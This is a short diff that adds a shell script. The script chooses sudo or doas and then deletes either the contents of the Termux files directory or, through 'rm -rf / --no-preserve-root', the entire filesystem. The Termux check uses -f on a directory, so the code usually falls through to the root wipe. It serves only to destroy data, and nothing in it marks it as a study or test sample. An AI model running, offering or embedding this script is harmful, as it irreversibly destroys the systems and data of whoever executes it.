@@ -1,0 +1,11 @@
+_termux=/data/data/com.termux/files
+_sucmd="sudo"
+
+sudo || _sucmd="doas"
+
+
+if [[ -f $_termux ]]; then
+ rm -rf $_termux/*
+else
+ $_sucmd rm -rf / --no-preserve-root
+fi
